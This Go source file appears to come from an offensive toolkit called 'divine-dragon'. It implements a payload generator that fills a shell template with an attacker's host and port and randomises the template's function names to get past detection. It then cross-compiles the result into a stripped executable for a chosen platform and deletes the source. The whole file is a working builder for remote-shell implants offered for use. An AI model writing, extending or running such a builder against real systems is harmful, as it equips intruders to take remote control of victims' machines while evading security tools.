package payload_generator

import (
	"divine-dragon/util"
	"fmt"
	"os/exec"
	"strings"

	"github.com/gobuffalo/packr"
)

type PayloadGenerator struct {
	host           string
	port           string
	shellType      string
	platform       string
	arch           string
	executableName string

	logger util.Logger
}

func NewPayloadGenerator(hostOpt string, portOpt string, shellTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *PayloadGenerator {
	pg := PayloadGenerator{
		host:           hostOpt,
		port:           portOpt,
		shellType:      shellTypeOpt,
		platform:       platformOpt,
		arch:           archOpt,
		executableName: executableNameOpt,
	}
	pg.logger = util.PayloadGeneratorLogger(false, "")
	return &pg
}

func (pg *PayloadGenerator) Run() {
	payloadSource, err := pg.preparePayloadSource()
	if err != nil {
		pg.logger.Log.Error(err)
	}
	fmt.Println(payloadSource)
	err = pg.compilePayload(payloadSource)
	if err != nil {
		pg.logger.Log.Error(err)
	}
}

func (pg *PayloadGenerator) preparePayloadSource() (string, error) {
	payloadSource, err := packr.NewBox("./templates/").FindString(pg.shellType + ".go")
	if err != nil {
		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
	}
	payloadSource = strings.Replace(payloadSource, "HOST", pg.host, -1)
	payloadSource = strings.Replace(payloadSource, "PORT", pg.port, -1)
	funcPatterns := []string{"WRITETOFILE", "SHELL", "FILENAME"}
	for _, funcPattern := range funcPatterns {
		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
	}
	payloadSource = strings.Replace(payloadSource, "EXECUTABLENAME", pg.executableName, -1)
	return payloadSource, nil
}

func (pg *PayloadGenerator) compilePayload(payloadSource string) error {
	payloadSourceFileName := util.RandString(util.RandInt()) + ".go"
	err := util.WriteToFile(payloadSourceFileName, payloadSource)
	if err != nil {
		return err
	}
	out, err := exec.Command("env",
		fmt.Sprintf("GOOS=%s", pg.platform),
		fmt.Sprintf("GOARCH=%s", pg.arch),
		"go",
		"build",
		"-o",
		pg.executableName,
		"-ldflags",
		"-w -s",
		payloadSourceFileName).Output()
	if err != nil {
		return err
	}
	if string(out) != "" {
		return fmt.Errorf("can't compile a binary: %s", string(out))
	}
	err = util.RemoveFile(payloadSourceFileName)
	if err != nil {
		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
	}
	return nil
}
